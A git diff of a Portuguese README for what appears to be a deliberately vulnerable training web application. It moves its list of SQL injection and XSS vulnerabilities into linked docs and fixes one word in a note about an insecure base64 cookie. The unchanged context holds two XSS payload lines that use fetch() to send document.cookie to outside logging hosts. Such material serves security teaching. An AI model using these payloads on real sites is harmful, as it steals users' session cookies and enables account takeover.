@@ -65,18 +65,10 @@ Main Class -> RootApplication.java
 - NodeJS/JavaScript: <a href="https://www.npmjs.com/package/yarn-audit-html">yarn audit html report</a>
 
 ## Vulnerabilidades
-- SQL Injection
-    - Login
-    - Pesquisa de usuários
-- XSS
-    - Reflected
-        - /hello?nome=Bob
-    - DOM
-        - Filtro na listagem de POSTS
-    - Stored
-        - Comentários dos posts    
+- [SQL Injection](./docs/vulns/sql-injection.md)
+- [XSS](./docs/vulns/xss.md)
 - Cookie
-    - É apenas um base64 e a aplicação confia no que o cliente envia.
+    - É apenas um base64 e a aplicação confia no que o cliente enviar.
 
 fetch('https://servidor-de-log.free.beeceptor.com/todos?cookie=' +  document.cookie)
 fetch('http://logger.crescer.lab/?cookie=' +  document.cookie)
